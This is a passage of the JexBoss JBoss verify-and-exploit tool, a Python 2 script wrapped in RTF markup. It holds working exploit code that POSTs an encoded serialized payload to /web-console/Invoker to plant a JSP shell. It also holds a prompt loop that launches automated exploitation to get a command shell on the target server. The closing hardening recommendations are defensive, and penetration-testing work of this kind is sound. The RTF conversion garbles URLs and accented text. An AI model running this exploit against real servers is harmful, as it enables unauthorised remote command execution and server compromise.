\tab\tab\tab\tab "\\x6d\\x3a\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x3d\\x4d\\x61\\x69\\x6e\\x44\\x65"\par
\par
\tab\tab\tab\tab "\\x70\\x6c\\x6f\\x79\\x65\\x72\\x78")\par
\par
\tab conn = getConnection(url)\par
\par
\tab headers = \{ "Content-Type" : "application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation",\par
\par
\tab\tab\tab\tab "Accept"  : "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2"\}\par
\par
\tab conn.request("POST", "/web-console/Invoker", payload, headers)\par
\par
\tab response = conn.getresponse()\par
\par
\tab result = response.status\par
\par
\tab if result == 401:\par
\par
\tab\tab print "   Retrying..."\par
\par
\tab\tab conn.close()\par
\par
\tab\tab conn.request("HEAD", "/web-console/Invoker", payload, headers)\par
\par
\tab\tab response = conn.getresponse()\par
\par
\tab\tab result = response.status\par
\par
\tab conn.close\par
\par
\tab return getSuccessfully(url, "/jbossass/jbossass.jsp")\par
\par
\par
\par
\tab\par
\par
def clear():\par
\par
\tab if os.name == 'posix':\par
\par
\tab\tab os.system('clear')\par
\par
\tab elif os.name == ('ce', 'nt', 'dos'):\par
\par
\tab\tab os.system('cls')\par
\par
\par
\par
def checkArgs(args):\par
\par
\tab if len(args) < 2 or args[1].count('.') < 1:\par
\par
\tab\tab return 1,"You must provide the host name or IP address you want to test."\par
\par
\tab elif len(args[1].split('://')) == 1:\par
\par
\tab\tab return 2, 'Changing address "%s" to "{{\field{\*\fldinst{HYPERLINK http://%s }}{\fldrslt{http://%s\ul0\cf0}}}}\f0\fs22 "' %(args[1], args[1])\par
\par
\tab elif args[1].count('http') == 1 and args[1].count('.') > 1:\par
\par
\tab\tab return 0, ""\par
\par
\tab else:\par
\par
\tab\tab return 1, 'Par\'c3\f1\u402?\f0\'c2\'a2metro inv\'c3\f1\u402?\f0\'c2\'a1lido'\par
\par
\par
\par
def banner():\par
\par
\tab clear()\par
\par
\tab print (RED1+"\\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\\n"\par
\par
  \tab           " |                                                      |\\n"\par
\par
              " | @author:  Jo\'c3\f1\u402?\f0\'c2\'a3o Filho Matos Figueiredo                |\\n"\par
\par
              " | @contact: joaomatosf@gmail.com                       |\\n"\par
\par
\tab           " |                                                      |\\n"\par
\par
\tab           " | @update: {{\field{\*\fldinst{HYPERLINK https://github.com/joaomatosf/jexboss }}{\fldrslt{https://github.com/joaomatosf/jexboss\ul0\cf0}}}}\f0\fs22        |\\n"\par
\par
              " #______________________________________________________#\\n\\n" )\par
\par
\par
\par
banner()\par
\par
# check python version\par
\par
if sys.version_info[0] == 3:\par
\par
\tab print (RED + "\\n * Not compatible with version 3 of python.\\n"\par
\par
\tab\tab\tab\tab   "   Please run it with version 2.7 or lower.\\n\\n"\par
\par
\tab\tab\tab +BLUE+" * Example:\\n"\par
\par
\tab\tab\tab\tab   "   python2.7 " + sys.argv[0]+ " {{\field{\*\fldinst{HYPERLINK https://site.com\\\\n\\\\n"+ENDC }}{\fldrslt{https://site.com\\n\\n"+ENDC\ul0\cf0}}}}\f0\fs22  )\par
\par
\tab sys.exit(1)\par
\par
\par
\par
# check Args\par
\par
status, message = checkArgs(sys.argv)\par
\par
if status == 0:\par
\par
\tab url = sys.argv[1]\par
\par
elif status == 1:\par
\par
\tab print RED + "\\n * Error: %s" %message\par
\par
\tab print BLUE + "\\n Example:\\n python %s {{\field{\*\fldinst{HYPERLINK https://site.com.br\\\\n }}{\fldrslt{https://site.com.br\\n\ul0\cf0}}}}\f0\fs22 " %sys.argv[0] + ENDC\par
\par
\tab sys.exit(status)\par
\par
elif status == 2:\par
\par
\tab url = ''.join(['http://',sys.argv[1]])\par
\par
\par
\par
# check vulnerabilities\par
\par
mapResult = checkVul(url)\par
\par
\par
\par
# performs exploitation\par
\par
for i in ["jmx-console", "web-console", "JMXInvokerServlet"]:\par
\par
\tab if mapResult[i] == 200 or mapResult[i] == 500:\par
\par
\tab\tab print BLUE + ("\\n\\n * Do you want to try to run an automated exploitation via \\""+BOLD+i+NORMAL+"\\" ?\\n"\par
\par
\tab\tab\tab    \tab       "   This operation will provide a simple command shell to execute commands on the server..\\n"\par
\par
\tab\tab\tab    \tab  +RED+"   Continue only if you have permission!" +ENDC)\par
\par
\tab\tab if raw_input("   yes/NO ? ").lower() == "yes":\par
\par
\tab\tab\tab autoExploit(url, i)\par
\par
\par
\par
# resume results\par
\par
if mapResult.values().count(200) > 0:\par
\par
\tab banner()\par
\par
\tab print RED+ " Results: potentially compromised server!" +ENDC\par
\par
\tab print (GREEN+" * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\\n\\n"\par
\par
\tab\tab\tab   " Recommendations: \\n"\par
\par
\tab\tab\tab   " - Remove web consoles and services that are not used, eg:\\n"\par
\par
\tab\tab\tab   "    $ rm web-console.war\\n"\par
\par
\tab\tab\tab   "    $ rm http-invoker.sar\\n"\par
\par
\tab\tab\tab   "    $ rm jmx-console.war\\n"\par
\par
\tab\tab\tab   "    $ rm jmx-invoker-adaptor-server.sar\\n"\par
\par
\tab\tab\tab   "    $ rm admin-console.war\\n"\par
\par
\tab\tab\tab   " - Use a reverse proxy (eg. nginx, apache, f5)\\n"\par
\par
\tab\tab\tab   " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\\n"\par
\par
\tab\tab\tab   " - Search vestiges of exploitation within the directories \\"deploy\\" or \\"management\\".\\n\\n"\par
\par
\tab\tab\tab   " References:\\n"\par
\par
\tab\tab\tab   "   [1] - {{\field{\*\fldinst{HYPERLINK https://developer.jboss.org/wiki/SecureTheJmxConsole\\\\n }}{\fldrslt{https://developer.jboss.org/wiki/SecureTheJmxConsole\\n\ul0\cf0}}}}\f0\fs22 "\par
\par
\tab\tab\tab   "   [2] - {{\field{\*\fldinst{HYPERLINK https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\\\\n }}{\fldrslt{https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\\n\ul0\cf0}}}}\f0\fs22 "\par
\par
\tab\tab\tab   "\\n"\par
\par
\tab\tab\tab   " - If possible, discard this server!\\n\\n"\par
\par
\tab\tab\tab   " * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\\n" )\par
\par
elif mapResult.values().count(505) == 0:\par
\par
\tab print ( GREEN+ "\\n\\n * Results: \\n"\par
\par
\tab\tab\tab "   The server is not vulnerable to bugs tested ... :D\\n\\n" + ENDC)\par
\par
\par
\par
# infos\tab\par
\par
print (ENDC+" * Info: review, suggestions, updates, etc: \\n"\par
\par
\tab\tab\tab  "   {{\field{\*\fldinst{HYPERLINK https://github.com/joaomatosf/jexboss\\\\n }}{\fldrslt{https://github.com/joaomatosf/jexboss\\n\ul0\cf0}}}}\f0\fs22 "\par
\par
\tab\tab\tab  "   joaomatosf@gmail.com\\n")\par
\par
\par
\par
print ENDC\par
}
 